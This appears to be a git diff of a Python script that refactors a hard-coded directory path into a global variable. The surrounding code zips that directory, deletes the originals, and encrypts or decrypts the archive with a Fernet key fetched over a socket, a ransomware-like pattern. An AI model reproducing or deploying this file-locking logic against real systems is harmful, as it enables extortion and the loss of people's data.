@@ -2,6 +2,7 @@ from all import *
 
 root = Tk()
 driver_name = ""
+dir_name = r"C:\temp\temp"
 
 def delete_files(path): # delete all files in directory
     files = glob.glob(f'{path}\*.*')
@@ -70,7 +71,7 @@ def secure_files(sock):
     
     print('stage 2')
 
-    dir_name = r'C:\temp\temp'
+    global dir_name
     shutil.make_archive(dir_name, 'zip', dir_name)
     delete_files(dir_name)
     key = get_key(sock)
@@ -82,10 +83,11 @@ def secure_files(sock):
     print(origin)
 
 def decrypt_files(sock):
-    dir_name = r'C:\temp\temp' + '.zip'
+    global dir_name
+    path = dir_name + '.zip'
     key = get_key(sock)
     decrypter = Fernet(key.encode())
-    decrypt_zip(decrypter, dir_name)
+    decrypt_zip(decrypter, path)
     print('d')
 
 
